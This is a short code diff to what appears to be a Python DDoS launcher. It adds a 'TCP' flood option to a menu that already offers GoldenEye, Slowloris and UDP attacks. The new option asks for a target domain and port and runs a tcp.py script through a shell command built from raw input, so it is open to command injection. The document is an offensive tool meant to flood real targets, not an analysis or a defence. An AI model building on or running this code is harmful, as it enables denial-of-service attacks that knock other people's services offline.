@@ -45,6 +45,7 @@ if choice == '2':
   	print ("GoldenEye = 2")
  	print ("Slowloris = 3")
 	print ("UDP = 4")
+	print ("TCP = 5")
 	print ("")
 	choice = raw_input("[root@ddos]#")
  	if choice == '1':
@@ -66,4 +67,9 @@ if choice == '2':
 		sz = raw_input("Enter Packet Size: ")
 		te = raw_input("Enter Time: ")
 		cal("cd files/udp && perl udp.pl "+ ip +" "+ pt +" "+ sz +" "+ te +" ")
+	if choice == '5':
+		ip = raw_input("Enter Domain: ")
+		pt = raw_input("Enter Port: ")
+		cal("cd files/udp && python tcp.py "+ ip +" "+ pt +"")
 exit
+			       
